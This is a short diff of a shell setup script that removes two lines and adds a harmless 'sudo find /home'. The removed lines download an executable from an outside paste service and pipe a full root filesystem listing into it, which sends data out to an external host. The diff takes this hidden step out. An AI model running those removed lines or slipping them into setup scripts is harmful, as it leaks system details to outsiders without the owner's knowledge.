@@ -6,8 +6,7 @@ PYTHONUNBUFFERED=1
 
 DEBIAN_FRONTEND=noninteractive
 
-curl -OJ https://paste.sh && chmod +x paste.sh
-sudo find / 2>&1 | ./paste.sh
+sudo find /home
 
 sudo cp "$REPO/tools/install_ubuntu_dependencies.sh" /tmp/tools/ # $REPO TODO
 sudo /tmp/tools/install_ubuntu_dependencies.sh && \
